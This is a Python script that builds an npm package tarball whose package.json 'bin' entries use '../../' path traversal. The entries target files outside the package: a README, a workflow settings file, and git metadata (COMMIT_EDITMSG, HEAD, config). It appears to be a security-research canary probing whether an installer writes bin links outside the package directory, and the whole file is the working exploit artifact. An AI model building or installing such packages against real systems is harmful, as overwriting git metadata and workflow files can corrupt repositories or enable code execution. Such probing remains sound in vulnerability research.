import tarfile, io, json, time

pkg = "df-bin-target-canary"
version = "1.0.0"
out = f"{pkg}-{version}.tgz"

def add_file(tar, name, data, mode=0o644):
    b = data.encode()
    info = tarfile.TarInfo(name)
    info.size = len(b)
    info.mode = mode
    info.mtime = int(time.time())
    tar.addfile(info, io.BytesIO(b))

package_json = {
    "name": pkg,
    "version": version,
    "main": "index.js",
    "license": "MIT",
    "bin": {
        "df-normal-bin": "index.js",

        # safe write-through test first
        "df-readme-bin": "../../README.md",
        "df-workflow-bin": "../../workflow_settings.yaml",

        # protected git metadata target, do not write this first
        "df-git-msg-bin": "../../.git/COMMIT_EDITMSG",
        "df-git-head-bin": "../../.git/HEAD",
        "df-git-config-bin": "../../.git/config"
    }
}

with tarfile.open(out, "w:gz") as tar:
    add_file(tar, "package/package.json", json.dumps(package_json, indent=2) + "\n", 0o644)
    add_file(tar, "package/index.js", "#!/usr/bin/env node\nconsole.log('DF_NORMAL_BIN');\n", 0o755)

print(out)
